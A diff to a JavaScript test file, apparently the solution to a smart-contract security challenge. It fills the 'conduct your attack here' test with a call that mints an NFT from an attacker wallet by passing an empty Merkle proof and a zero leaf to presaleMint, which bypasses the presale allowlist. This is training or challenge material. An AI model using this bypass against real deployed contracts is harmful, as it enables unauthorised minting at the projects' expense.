@@ -24,7 +24,9 @@ describe(NAME, function () {
         });
 
         it("conduct your attack here", async function () {
-            // do it
+            const leaf = ethers.constants.HashZero;
+            const proof = [];
+            await nftContract.connect(attackerWallet).presaleMint(proof, leaf);
         });
 
         after(async function () {
